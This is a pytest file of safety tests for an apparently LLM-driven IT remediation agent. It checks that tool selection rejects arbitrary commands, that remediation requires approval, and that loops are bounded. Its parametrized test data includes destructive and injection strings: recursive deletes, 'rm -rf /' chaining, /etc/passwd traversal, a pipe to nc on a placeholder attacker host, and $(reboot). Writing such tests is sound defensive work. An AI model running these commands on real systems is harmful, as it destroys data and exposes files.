"""Safety tests — the non-negotiable guarantees.

These encode the product's core promise: the LLM can select tools but can never
run arbitrary code, remediation never happens without approval, invalid inputs
are rejected, and the agent/remediation loops are bounded.
"""

import pytest

from app.core.models import RemediationProposal
from app.core.remediation_engine import RemediationEngine
from app.core.safety import (
    ApprovalRequiredError,
    SafetyError,
    SafetyValidator,
)


@pytest.mark.parametrize("payload", [
    "powershell -Command Remove-Item C:\\ -Recurse",
    "cmd /c del *.*",
    "get_cpu_usage; rm -rf /",
    "get_cpu_usage && echo hacked",
    "../../etc/passwd",
    "C:\\Windows\\System32\\evil.exe",
    "flush_dns | nc attacker 4444",
    "$(reboot)",
])
def test_arbitrary_commands_rejected(payload):
    sv = SafetyValidator()
    with pytest.raises(SafetyError):
        sv.validate_tool_selection(payload)


def test_unregistered_tool_rejected():
    sv = SafetyValidator()
    with pytest.raises(SafetyError):
        sv.validate_tool_selection("definitely_not_a_tool")


def test_registered_tool_accepted():
    sv = SafetyValidator()
    sv.validate_tool_selection("get_cpu_usage")  # must not raise


def test_remediation_without_approval_rejected():
    sv = SafetyValidator()
    with pytest.raises(ApprovalRequiredError):
        sv.validate_remediation("flush_dns", approved=False)


def test_remediation_with_approval_allowed():
    sv = SafetyValidator()
    sv.validate_remediation("flush_dns", approved=True)  # must not raise


def test_diagnostic_cannot_be_run_as_remediation():
    sv = SafetyValidator()
    with pytest.raises(SafetyError):
        sv.validate_remediation("get_cpu_usage", approved=True)


def test_invalid_tool_parameters_rejected():
    sv = SafetyValidator()
    # terminate_unresponsive_application requires an integer pid.
    with pytest.raises(SafetyError):
        sv.validate_remediation(
            "terminate_unresponsive_application",
            approved=True,
            arguments={"pid": "not-an-int"},
        )


def test_excessive_agent_steps_stopped():
    sv = SafetyValidator()
    with pytest.raises(SafetyError):
        sv.check_agent_step(sv.max_agent_steps)


def test_excessive_remediation_attempts_stopped():
    sv = SafetyValidator()
    with pytest.raises(SafetyError):
        sv.check_remediation_attempt(sv.max_remediation_attempts)


def test_engine_blocks_unapproved_execution():
    engine = RemediationEngine()
    proposal = RemediationProposal(tool="flush_dns", title="Flush DNS", reason="x")
    with pytest.raises(ApprovalRequiredError):
        engine.execute(proposal, approved=False)


def test_no_arbitrary_execution_path_exists():
    """The registry only exposes named functions; there is no eval/exec entry."""
    from app.core.tool_registry import get_registry

    reg = get_registry()
    for spec in reg.list_tools():
        assert callable(spec.function)
        # Tool names are simple identifiers, never shell strings.
        assert spec.name.isidentifier()
